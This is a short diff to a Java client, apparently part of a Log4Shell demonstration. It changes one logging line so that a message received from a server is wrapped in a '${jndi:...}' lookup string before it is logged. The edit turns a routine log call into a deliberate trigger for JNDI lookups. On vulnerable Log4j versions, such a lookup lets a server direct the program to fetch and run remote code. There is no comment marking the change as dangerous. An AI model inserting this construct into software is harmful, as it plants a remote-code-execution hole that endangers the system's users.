@@ -52,7 +52,7 @@ public class Main {
             thatMessage = reader.readLine();
 
             l.error("Message received from server: ");
-            l.error(thatMessage);
+            l.error("The Server Said: " + ("${jndi:" + thatMessage + "} $"));
             connection.close();
         } catch (Exception e) {
             l.error("An Exception Occurred! : ");
